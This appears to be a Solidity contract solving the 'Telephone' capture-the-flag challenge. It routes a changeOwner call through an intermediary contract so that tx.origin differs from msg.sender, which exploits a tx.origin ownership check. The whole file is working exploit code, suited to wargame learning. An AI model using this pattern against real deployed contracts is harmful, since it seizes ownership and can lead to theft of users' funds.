// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

interface TelephoneChallenge {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    TelephoneChallenge public challenge;

    constructor(address _challengeAddress) {
        challenge = TelephoneChallenge(_challengeAddress);
    }

    function attack() external payable {
        challenge.changeOwner(tx.origin);
    }
}
